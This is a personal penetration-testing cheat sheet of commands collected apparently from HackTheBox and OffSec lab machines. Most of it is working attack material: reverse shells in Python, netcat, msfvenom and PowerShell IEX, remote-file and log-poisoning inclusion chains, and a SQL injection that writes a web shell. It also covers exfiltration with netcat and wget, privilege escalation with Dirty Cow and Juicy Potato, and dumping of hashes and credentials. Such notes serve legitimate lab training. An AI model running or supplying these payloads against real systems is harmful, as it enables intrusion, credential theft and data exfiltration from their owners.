Attach hostnames to an ip
  - go to etc/hosts and edit 
    - you will need to run the following on hosts: sudo chmod 777 hosts 
  - add a line with the following format: <IP> (tab) <Hostname> <Hostname>
  	- Or: sudo echo "10.10.10.79 valentine.htb" | sudo tee -a /etc/hosts   
Exiting a restricted shell: 
	- :set shell=/bin/bash
	- :shell
	- export PATH=/bin:/usr/bin:$PATH
	- export SHELL=/bin/bash:$SHELL
Search for a specific file on Linux: find / -name "user.txt" 2>/dev/null  

Access a website on 127.0.0.1:8443 rather than 10.10.10.184:8443: ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443 

Enumerate a WordPress website
  - wpscan --url https://brainfuck.htb/ --disable-tls-checks
  	- Look for vulnerable or outdated plugins to exploit: wpscan --url http://10.10.10.88/webservices/wp -e ap --plugins-detection aggressive
  - wpscan --url https://brainfuck.htb/ --disable-tls-checks --enumerate p --enumerate t --enumerate u
Find bash history: 
	- Go to home dir
		- find -name ".bash_history" -exec cat {} \;
Shell Shock: 
	- When a pentesting a website over port 80 and you find a directory named cgi-bin, then you need to test for shell shock
		- checking for shell shock: nmap -sV -p 80 -Pn --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56
Burp Suite Tricks: 
	- Add the following line to a get request to forward your request through a local IP to trick the server that you are local to it: X-Forwarded-For: 127.0.0.1
		- To add this header to our proxy session permanently, we'll navigate to Proxy -> Options, then scroll down to Match and Replace > add > (fill the replace field with X-Forwarded-For: 127.0.0.1 )
	- Change content type to png: 
		Content-Disposition: form-data; name="document"; filename="shell.php"
		Content-Type: image/png
Nikto
	- nikto -host http://10.10.10.15
		- If webdav is enabled: davtest -url http://10.10.10.15 -move -cleanup	
	- nikto -host http://192.168.47.56 -port 8089 -nossl
List Linux Capablities: getcap -r / 2>/dev/null
	- exploit: https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/	
Curl: 
	- Regular curl: curl <URL>
	- Specify a request: curl -X POST <URL>
	- Specify a length: curl -d "" -X POST <URL>
	
Ping TTL time meaning: 
	- 127: windows 
	- 64: Linux
	- 127 > : Possibliy network equipment. 
	
mount
	- if you see a mountd service, do the following 
		- check what shares are availble: showmount -e <address of machine>
		- create a directory to attach it to the share: mkdir /mnt/nfs
			- $ showmount -e remote.htb
					Export list for remote.htb:
					/site_backups (everyone)
		- Mount the share: mount -t nfs -o vers=3 <address of machine>:<share name or path> /mnt/nfs
			- $ mount -t nfs -o vers=3 remote.htb:/site_backups /mnt/nfs
			
How to test for LFT:
	- nc -lnvp 80
	- curl http://192.168.79.53:4443/site/index.php?page=http://192.168.49.79/hi 
	- if a proper response with hi in it, then move on to uploading a shell: 
	Method 1:
		- msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.79 LPORT=4443(website port) -f exe > reverse.exe 
	- We need to create two PHP file. We will name them “step1.php” and “step2.php”. In step 1, we include PHP code to reach back to our HTTP server and download our reverse shell, reverse.exe. In step 2, we include PHP code to run the .exe from the box.
		- step1.php: 
				<?php 
$exec = system('certutil.exe -urlcache -split -f "http://192.168.49.68/reverse.exe" shell.exe', $val); 
?> 
		- step2.php:
				<?php 
$exec = system('reverse.exe', $val); 
?> 
	- Start http server where the files are: python2 -m SimpleHTTPServer 80
	- Grab step1: curl http://192.168.79.53:4443/site/index.php?page=http://192.168.49.79/step1.php
	- start nc: nc -lnvp 4443
	- Grab step2: curl http://192.168.79.53:4443/site/index.php?page=http://192.168.49.79/step2.php
	Method 2: 
	 - msfvenom -p php/reverse_php LHOST=192.168.49.213 LPORT=443 -f raw > shell.php
	 - nc -lnvp 443
	 - curl http://192.168.213.53:8080/site/index.php?page=http://192.168.49.213/shell.php
	Note: If method 1 fails at the last step, use the 2nd method to execute the exe file.
	
	
Another LFI Method: (https://soolascybersecurity.com/2022/02/21/solstice-not-happy-jan/)

- PROVING LFI EXISTS: curl 192.168.238.72:8593?book=../../../../../etc/passwd
 
- TEST ITS PRESENCE: curl 192.168.238.72:8593?book=../../../../../var/log/apache2/access.log 
 
- ECHO THE COMMAND USING NC TO ACCESS.LOG: echo "GET <?php echo 'TEST123' ?> HTTP/1.1" | nc 192.168.238.72 80 
 
- TESTING IF COMMAND EXISTS ON ACCESS.LOG: curl 192.168.238.72:8593?book=../../../../../var/log/apache2/access.log
 
- REVERSE SHELL: echo "GET <?php system('nc -e /bin/bash 192.168.49.238 9001'); ?> HTTP/1.1" | nc 192.168.238.72 80 ()
 
curl 192.168.238.72:8593?book=../../../../../var/log/apache2/access.log (TRIGGERING REVERSE SHELL)


Hydra: 
	- How to brute force a login page
		- sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
			- sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form '/department/login.php:username=admin&password=^PASS^:Invalid Password!'
		- To determine both the method and the request body: Inspect Element > Network
			- Method will be seen easily as http-post-form
			- right click and edit & resend then copy the request body. 
SearchSploit 
  - searchsploit <service name>
    - To grab specific text file: searchsploit -x file.txt
    
Pentesting UDP port 161/UDP: 
	- Get version and check if the public string is a valid credential: sudo nmap -Pn -sU -p 161 --script snmp-brute -oN snmp_brute -sV 10.10.10.116 > snmp.txt
		- If you get more info using the above command, use the version (1) and communicty string (public): snmp-check 10.10.10.116 -c public -v 1 > snmp-enum.txt

To crack an SSH key with John
  - python sshng2john.py id_rsa > ssh_login
  - john ssh_login --wordlist=/usr/share/wordlists/rockyou.txt
    - Then, ssh with the key and the obtained password: ssh -i id_rsa orestis@10.10.10.17
    
Generate an SSH key: ssh-keygen -f postman  

Find hidden info in an image file: 
	- Install steghide: steghide (then enter y to install it)
	- steghide info irked.jpg
	- steghide extract -sf irked.jpg
	
Enumerating SMB: https://infinitelogins.com/2020/06/17/enumerating-smb-for-pentesting/#:~:text=protocol%20negotiation%20failed%3A%20NT_STATUS_CONNECTION_DISCONNECTED%20This%20error%20occurs%20because,to%20use%20the%20weaker%20and%20more%20insecure%20protocols.
	- smbmap -H <IP Address>
	- sudo smbclient \\\\<ip-addr>\\<share>
		- NT_STATUS_CONNECTION_DISCONNECTED:
			- sudo nano /etc/samba/smb.conf
			- Under Global: client min protocol = LANMAN1
	- List Shares: smbclient -L 10.10.10.134 
	- Utilize the smbmap tool to assist with recursively going through each directory for interesting files: smbmap -u null -p null -H <IP> -s <share> -R

	- Access SMB as a certain user: smbmap -H bastion.htb -u Guest or smbclient //10.10.10.100/Users -U SVC_TGS
	
Brute Force SMB: hydra -L usernames.txt -P rockyou.txt 10.10.10.193 smb 
	- crackmapexec smb 192.168.89.122 -u username -p CrabSharkJellyfish192
		- does not matter if the username and passowrds are a lits or a or a single item


Reset SMB Password: smbpasswd -r 10.10.10.193 -U bhult

Decoding a base64 file: cat myplace.backup | base64 -d > results

Cracking a zip file with a pssword: 
	- zip2john results.zip > hash.txt
	- john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
	
Adding code to an exisisting script/program on Linux: 

	- python reverseshell example: echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.23",1336));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> tmp.py

To clear contents of a file: cp /dev/null/ tmp.py
nmap
  - Initial Scan: nmap -sC -sV -O -oA initial 10.10.10.13
  - Run the below as you enumerate your initial findings
    - Scan all ports: nmap -sC -sV -O -p- -oA full 10.10.10.13
    	- Faster all port scan: nmap  -p 0-65535 192.168.122.1 -T5
    - UDP Scan: nmap -sU -O -p- -oA udp 10.10.10.13
    - UDP 1000 ports scan: nmap -sU udep-1000 10.10.10.13 
    - Vuln Scan: nmap--script vuln 10.10.10.13
    - scan 445 for vul: nmap -Pn -p 445 --script smb-vuln-* 10.10.10.4 > 445.txt  
    	- https://github.com/1nf1n17yk1ng/MS17-010_CVE-2017-0143
    
nslookup
  - if port 53 (DNS) is open, ask the DNS server what domain name is associated with a certian IP by running the following
    - nslookup 
    - server <dns ip>
    - <ip in question>
    
Priv Escalation by modifying an unusual binary: 
	- Look at some functions of sysinfo: ltrace /bin/sysinfo 2>&1 | grep popen
	- We see a binary named free being called. 
		- adjust the $PATH variable to call our own code instead: PATH=/tmp:$PATH
		- create fake free binary: echo "/bin/bash" >> /tmp/free
			- chmod +x free
		- run sysinfo: /bin/sysinfo

Zone Transfer 
  - host -l <domain name> <DNS IP>
  - Other method: dig axfr @<DNS IP> <domain name>
  
Retreiving emails from an email server
	- nc -nv <IP> 110
	- USER <username>
	- PASS <Password>
	- retr 1
	- retr 2

Dirty Cow (Linux Prive Esc) 
	- Download on the attacker machine: https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
	- uploade it to the vicitm 
	- the vicitm needs to have gcc installed 
	- on the vicitm: 
		- gcc -pthread dirty.c -o dirty -lcrypt
		- chmod 777 dirty 
		- ./dirty <desired password>
	- use the password to ssh into the vicitm in a new window. 
	

rbash escape: ssh mindy@10.10.10.51 -t bash

Manual SQL Injection: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
	- To find out how many columns append order by <number of suspected columns>: http://10.10.10.143/room.php?cod=1 order by 7
	- To determine where the column result is being outputted on the page: http://10.10.10.143/room.php?cod=9999 union select 1,2,3,4,5,6,7
		- Sometimes only one output is allowed at a time, so make sure the first item is invalid
	- To get version http://10.10.10.143/room.php?cod=9999 union select 1,(select @@version),3,4,5,6,7
	- get username: http://10.10.10.143/room.php?cod=9999 union select 1,(select password FROM mysql.user),3,4,5,6,7
		- http://10.10.10.143/room.php?cod=9999 union select 1,(select group_concat(host,user,password) FROM mysql.user),3,4,5,6,7
		- http://10.10.10.143/room.php?cod=9999 union select 1,LOAD_FILE('/etc/passwd'),3,4,5,6,7
	- To upload a shell: http://10.10.10.143/room.php?cod=9999 union select 1,(select '<?php exec(\"wget -O /var/www/html/shell.php http://10.10.14.12:5555/php-reverse-shell.php\");?>'),3,4,5,6,7 INTO OUTFILE '/var/www/html/test4.php'
		- Start simple http server to serve your php shell
		- browse to http://10.10.10.143/test4.php
		- nc -lncvp 1234
		- browse to httP;//10.10.10.143/shell.php
		
Exploit systemctl on Linux: https://ranakhalil101.medium.com/hack-the-box-jarvis-writeup-w-o-metasploit-9f4cc7907c87	
		
		
		
		
masscan: sudo masscan -e tun0 -p1-65535 --rate=1000 10.10.10.43

gobuster

  Update: sudo apt update && apt upgrade -y
  Install gobuster: sudo apt-get install gobuster 
  Run it: gobuster dir -u http://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster/80results.txt 
    To run with https: add -k at the end to ignore certificate and adjust http to https. 
  Run it and look for specific extensions: gobuster dir -u http://10.10.10.43 -w /usr/share/wordlists/Dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.sh

Upgrade Shell
https://github.com/SammyBasri/HackTheBox/blob/main/notes.txt
  - python -c 'import pty;pty.spawn("/bin/bash")'

PDF Cracking: 
	- sudo apt install pdfcrack 
	- pdfcrack -f <pdf file> -w <word list file>
To find files/folders owned by a user
  - find / -user user 2> /dev/null

See the what all binaries have the SUID bit set: find / -perm -u=s -type f 2>/dev/null
  
To switch to a different user while in a Linux shell: su - <username>  or su <usrename>

Using Netcat to exfil files 
  - On attacker machine: nc -lnvp 80 > ExfilFile
  - On victim machine: nc <attackers IP> 80 < ExfilFile
  
Getting hashes out of a ntds.dit and ntds.bin
	- bin is the SYSTEM file 
  - impacket-secretsdump -ntds ntds.dit -system <bin file> LOCAL

Proxy: Connecting to a VNC service over an SSH connection.
	 - ssh: ssh -L 5901:127.0.0.1:5901 -N -f -l charix 10.10.10.84
	 	- vncviewer localhost:5901 -passwd secret

Enum Notes:

  - Tomcat services usually have a login page at 10.10.10.55/manager/html
  - To check what other devices the victim is communicating with: arp -a 
    - Then check a few ports on the machines found: nc -v <machine address> <port>
  - FTP Anonymous loging: ftp <address>
  	- anonymous/<blank>
  - To create shell as another user: sudo -u <username> /bin/bash
  - List all process: ps aux
  - Simple Prive Esc: sudo -l 
  - To list setuid binaries: find / -perm -4000 2>/dev/null
  - internal.conf can potentially be found at /etc/apache2/sites-enabled
  - List files and folder owned by a user: find / -user jimmy 2>/dev/null

John: 
	- john --worldlist=rockyou.txt <hash file>
		- john --show <hash file>
Hashcat: 
	- hashcat -m 18200 --force -a 0 hashes.asreproast /usr/share/wordlists/rockyou.tx
Exiftool: How to hide php shell within an image
	- sudo apt update && apt upgrade -y 
	- sudo apt install exiftool -y
	- exiftool -Comment="$(< rev.php)" <image file that will be uploaded>
		- If the shell doesn't execute, rename the uplaoded file to <name>.php.jpg
Wget Exfil:
	- On your machine: nc -lnvp 80
	- On victim: wget --post-file=/root/root.txt <attacker IP>

Dumping a local Mysql DB: You need credentials
	- check if active: systemctl status mysql
	- dump: mysqldump --opt -u theseus --password=iamkingtheseus  --all-databases> pp.sql

  
Use scp to download files via ssh
     - systemctl start ssh.socket 
     - sudo scp root@192.168.100.22:/etc/file .
     - Upload: scp -p test 296640a3b825115a47b68fc44501c828@192.168.56.125:.
     	- -p is used to maintain perms.
     
Password Protected SSH Private Key: 
	- python ssh2john.py key > out.txt 
	- sudo john --wordlist=rockyou.txt out.txt
  
 
 Windows: 
 	- How to extract files (smb needs to be running on the victim)
		- Attacker: 
			- impacket-smbserver smb Downloads/ 
		- Victim: 
			- net use \\10.10.16.23\smb /u:df df
			- copy 20220314100025_BloodHound.zip \\10.10.16.23\smb\
	- Decrypting GPP (cpassword): https://github.com/t0thkr1s/gpp-decrypt?msclkid=92feef0bab9911ecbdd203a7143ce894
	
	- If kerberos is running on port 88 and we have an owned user account, you can get hash for admin by: python3 GetUserSPNS.py -request active.htb/SVC_TGS
 	- File/Folder enume:
		- Check access of a file: icacls <filename or dir>
		- Check ownership of a file: dir /q root.txt
			- if you own a file but can't access it, you may grant yourself access: icacls root.txt /grant <username>:F
		- 
 	- tasklist: lists all running tasks.  
		- Look where the process is stored: where /R C:\ *cloud*.exe
 
	- Port 445: sudo nmap -Pn -p 445 --script smb-vuln-* legacy.htb
	- msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=1234 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
		- msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f aspx > shell.aspx
		- when uploading this shell to an ftp server that is connected to an IIS, FTP to the server, run "bin" and upload the shell. 
	- After establishing RCE on a machine, follow these steps to get a shell: 
		- On attacker machine: 
			- Locate and copy nc.exe to a dir of your choice
				- locate nc.exe 
				- cp <nc.exe path> .
			- python -m SimpleHTTPServer 80
			- nc -lnvp 1234
		- On victim machine
			- mkdir C:\temp
			- certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe
			- C:\temp\nc.exe -e cmd.exe 10.10.XX.XX 1234
		- Alternative method: 
			- On attacker
				- msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.10.14.7 LPORT=1234 -f exe > shell.exe
				- nc -lnvp 1234
				- python -m SimpleHTTPServer 80
			- On victim
				- download shell: certutil -f -split -urlcache http://10.10.16.23/shell.exe C:\temp\shell.exe
				- execute it: C:\temp\shell.exe
		- Alternative method: 
			- Attacker: 
				- Find nc.exe and place it a known dir
				- python2 -m SimpleHTTPServer 80
				- nc -lnvp 1234
			- Victim: 
				- powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.49/nc.exe','ncat.exe')
					- or powershell wget http://10.10.16.18/nc.exe -outfile nc.exe
				- .\ncat.exe -e cmd.exe 10.10.14.49 4433
	- winrm
		- if you see a winrm service and you have credentials or if you see port 5985
			- sudo gem install evil-winrm 
			- evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161 
	- impacket
		- Start SMB server: impacket-smbserver smb Downloads/ 
		- On victim: copy \\10.10.16.12\smb\nc.exe
	
	Port forwarding with Chisel
		- Problem: The target service is running locally on the victim at port 8888. We want port to forward that 8888 connection to the attacker at 8080. 
		- Solution 
			- Attacker: 
				- Download chisel linux 386 
				- chmod 777 chisel  
				- ./chisel server --reverse
			- Victim: 
				- Download chisel win 386 
				- chisel.exe client 10.10.16.18:8080 R:8888:127.0.0.1:8888								

		
	- Bypassing shell uplaod filtering on IIS
		- Upload web.config to victim: https://raw.githubusercontent.com/tennc/webshell/master/aspx/web.config
		- On the attacker machine, locate nc.exe and serve via SMB: impacket-smbserver smb Downloads/ 
			- Listen for a connection: nc -lnvp 1234
		- http://bounty.htb/uploadedfiles/web.config?cmd=\\10.10.XX.XX\smb\nc.exe -e cmd.exe 10.10.XX.XX 1337
		
	- Privelege escalation 
		- MS14-070 (Windows 2003):
			- https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
			- Get nc.exe and churrasco.exe on the victim machine
			- C:\temp\churrasco.exe "C:\\temp\\nc.exe -e cmd.exe 10.10.XX.XX 1337"
		- Juicy Potato
			- SeImpersonatePrivilege or seAssignPrimaryTokenPrivilege need to be enabled: whoami /priv
			- Download the exe: https://github.com/ohpe/juicy-potato/releases/tag/v0.1
			- On the attacker machine listen on a port of you choosing: nc -lnvp 1337
			- on the vicitm machine: 
				- go to the parent dir
				
			- On the victim machine: juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\tmp\nc.exe -e cmd.exe 10.10.XX.XX 1337" -t *
		- Find some credentials in the registry for autologon:
			- reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

		- Juicy potato alternative method: 
			- SeImpersonatePrivilege or seAssignPrimaryTokenPrivilege needs to be enabled: whoami /priv
			- systeminfo shows system is 32bits
			- Download juicypotato x86: https://github.com/ivanitlearning/Juicy-Potato-x86/releases
			- Create a reverse shell: msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f exe > shell.exe
			- uploade both files to victim: 
			  - On attacker: 
			  	- impacket-smbserver smb Downloads/
				- nc -lnvp 1337
			  - On Victim:
			  	- mkdir C:\temp
				- cd C:\temp
				- copy \\10.10.16.12\smb\shell.exe
				- copy \\10.10.16.12\smb\juicypotato86.exe
				- juicypotato86.exe -l 1337 -p shell.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
	
	- LDAP
		- To get DN "dc=htb,dc=local": ldapsearch -h 10.10.10.161 -x -s base namingcontexts 
		- You can naming context using nmap: nmap -n -sV --script "ldap* and not brute" 192.168.89.122  
		- ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local"
		- Get description (you may find helpful info): ldapsearch -x -h 192.168.89.122 -D '' -w '' -b "DC=hutch,DC=offsec" |
grep description
		- Get usernames: ldapsearch -x -h 192.168.89.122 -D '' -w '' -b "DC=hutch,DC=offsec" |
 grep sAMAccountName: 
		- To query for user info: ldapsearch -h 10.10.10.161 -p 389 -x -b "dc=htb,dc=local" '(objectClass=Person)'
		
	- BloodHound: Domain Controller Informaition Extraction
		- Download the latest BloodHound release: git clone https://github.com/BloodHoundAD/BloodHound.git
		- Start an smb share on the attacker machine: impacket-smbserver smb BloodHound/
		- Download the following: wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.1.0/BloodHound-linux-x64.zip
		- Start neo4j(You will be asked to intall it): sudo neo4j console
			- Remote Interface at http://localhost:7474/browser/
			- creds: neorj/neo4j
		- Unzip the Linux BloodHound file and execute bloodhound: ./BloodHound --no-sandbox
		- Now go the BloodHound Cloned Dir and upload SharpHound.exe into the vicitm machine
			- Execute it: .\SharpHound.exe -c all
			- export it to your machine. See notes above about extraction.
		- Go back to bloodhound on your machine and upload the ip file you have extracted. 
			- Once uploaded, start by searching users you have owned and mark them as owned. 
			- We queried by shortest path from owned princeaples 
			- We find we are able to add accounts, and we want to add it to the exchange server 
				- Adding a user: net user <USername> <Password> /add /domain
				- Adding user to Exhange group: net group "Exchange Windows Permissions" /add Sameh

		


			
	- enum4linux: 
		- enum4linux forest.htb > enum4linux.txt
		- cat enum4linux.txt | grep -i users
		- After getting usernames, if kerberos is running on port 88, then you might be able to get password hashes by running this
			- python3 GetNPUsers.py  -dc-ip 10.10.10.161 htb.local/ -no-pass -usersfile users.txt
			- Then use John to crack obtained hashes or even crackstation if you're lucky. 
		

			
			
	- SirepRAT:
		- Download: git clond https://github.com/SafeBreach-Labs/SirepRAT
		- cd SirepRAT
		- install requeriments as explained in the github page.
		- "Donwload nc64.exe into this dierctory"
		- start python SimpleHTTPServer
		- Upload nc64.exe: python2 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -outfile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -uri 10.10.14.169/nc64.exe" --v
		- Start listening to a port for example 1234
			- python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\> python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe"" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.16.7 1234 -e powershell.exe" --v
			
	- Sherlock.ps1:
		- Once you get it on the attacker machine, start an http server on the attacker machine and run this command on the victim: powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.14.9/Sherlock.ps1'); Find-AllVulns
	- Example of chaining commands on windows: C:\temp> C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 


	- PowerUp.ps1:
		- Once you get a cmd shell, turn it to a powershell: powershell
		- Download PowerUp.ps1 on attacker
		- Serve it
		- On Victim 
			- IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/PowerUp.ps1')
			- Invoke-AllChecks
			- If applicable: Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "C:\Windows\Temp\nc64.exe 10.10.14.9 1234 -e cmd.exe"
			
	General Enum Notes: 
		- OS: systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
		- Juicy Potato: whoami /priv
		- netstat –nao
		- Password Location:
					dir C:\Windows\System32\config\RegBack\SAM
					dir C:\Windows\System32\config\RegBack\SYSTEM
		- Look for passwords: reg query HKLM /f pass /t REG_SZ /s

	
		
Good Windows PHP Reverse Shell: https://github.com/Dhayalanb/windows-php-reverse-shell
	- Make sure to adjust IP, PORT and TMP directory. 
	

Good unpatched Windows 8 Priv Esc Kernal exploit: https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120
	- x86.exe whoami
	- x86.exe shell.exe
		
			
			




  
    

  
    
    

  

